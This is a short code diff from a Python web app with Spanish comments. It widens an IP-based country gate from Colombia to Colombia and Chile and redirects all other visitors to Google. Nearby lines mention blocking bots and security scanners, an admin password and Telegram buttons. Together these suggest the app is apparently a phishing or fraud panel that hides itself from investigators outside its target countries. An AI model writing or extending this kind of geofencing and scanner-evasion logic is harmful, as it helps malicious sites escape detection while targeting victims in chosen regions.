@@ -28,14 +28,14 @@ ADMIN_PASS = os.environ.get("ADMIN_PASS")
 # URL Base para botones de Telegram
 BASE_URL = os.environ.get("BASE_URL")
 
-def is_colombia(ip):
+def is_allowed_country(ip):
     # Permitir localhost para pruebas
     if ip in ['127.0.0.1', 'localhost']:
         return True
     try:
         response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
         data = response.json()
-        return data.get('countryCode') == 'CO'
+        return data.get('countryCode') in ['CO', 'CL']
     except:
         return True # Si falla la API, permitimos por seguridad
 
@@ -50,7 +50,7 @@ def block_foreign_ips():
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
 
-    if not is_colombia(ip):
+    if not is_allowed_country(ip):
         return redirect("https://www.google.com")
 
     # Bloqueo de Bots y Scanners de Seguridad
